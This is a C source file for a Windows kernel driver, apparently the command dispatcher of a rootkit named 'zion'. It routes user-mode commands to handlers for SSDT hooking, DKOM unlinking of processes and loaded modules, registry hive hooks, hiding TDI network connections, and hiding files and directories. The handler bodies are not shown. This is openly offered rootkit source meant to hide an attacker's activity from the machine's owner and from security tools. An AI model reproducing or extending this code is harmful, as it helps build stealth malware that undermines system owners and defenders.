
#include <ntddk.h>
#include <windef.h>

#include "zion/server/zion_common.h"
#include "zion/zion_define.h"
#include "zion/server/zion_ioctl_mapper.h"
#include "zion_server.h"
#include "server_ioctl_dispatcher.h"
#include "zion\zion_file_filter_driver_ioctl.h"
#include "zion_file_filter_driver_impl.h"


#ifdef ALLOC_PRAGMA
    #pragma code_seg("PAGE")
#endif

BEGIN_IOCTL_MAPPING(Server_IOCTL_handler)
/*
NTSTATUS status = STATUS_SUCCESS;                                        \
PIO_STACK_LOCATION      irpStack;                                        \
ULONG                   inputBufferLength;                               \
ULONG                   outputBufferLength;                              \
ULONG                   ioControlCode;                                   \
PVOID                   ioBuffer;                                        \
irpStack = IoGetCurrentIrpStackLocation(Irp);                            \
ioControlCode= irpStack->Parameters.DeviceIoControl.IoControlCode;       \
ioBuffer = Irp->AssociatedIrp.SystemBuffer;                                     \
inputBufferLength = irpStack->Parameters.DeviceIoControl.InputBufferLength;     \
outputBufferLength = irpStack->Parameters.DeviceIoControl.OutputBufferLength;   \
*/

	IOCTL_MAPPING_START(IOCTL_ZION_CS_PKT_CMD)
		safe_trace("IOCTL_ZION_CS_PKT_CMD\n");
	if (CMD_SSDT_HOOK == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		SSDT_HOOK_SERVER(ioBuffer);
	if (CMD_DKOM_EPROCESS == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		DKOM_EPROCESS_SERVER(ioBuffer);
	if (CMD_DKOM_MODULE == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		DKOM_MODULE_SERVER(ioBuffer);
	if (CMD_HIVE_REG_HOOK == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		Hive_Registry_SERVER(ioBuffer);
	if (CMD_TDI_CONNECTION == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		TDI_CONNECTION_HIDE_SERVER(ioBuffer);
	if (CMD_FILE_FILTER == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		AddHideObject(((PZION_CS_PACKET)ioBuffer)->pData, CMD_FILE_FILTER);
	if (CMD_DIRECTORY_FILTER == ((PZION_CS_PACKET)ioBuffer)->dwCmd)
		AddHideObject(((PZION_CS_PACKET)ioBuffer)->pData, CMD_DIRECTORY_FILTER);


	break;
default:                                   
	status = STATUS_INVALID_PARAMETER;      
}        


Irp->IoStatus.Status = status;                  
Irp->IoStatus.Information = outputBufferLength; 
IoCompleteRequest( Irp, IO_NO_INCREMENT );      
return status; 
		}
else
return ZionPassThrough(DeviceObject,Irp);
}
//END_IOCTL_MAPPING()

#ifdef ALLOC_PRAGMA
    #pragma code_seg()
#endif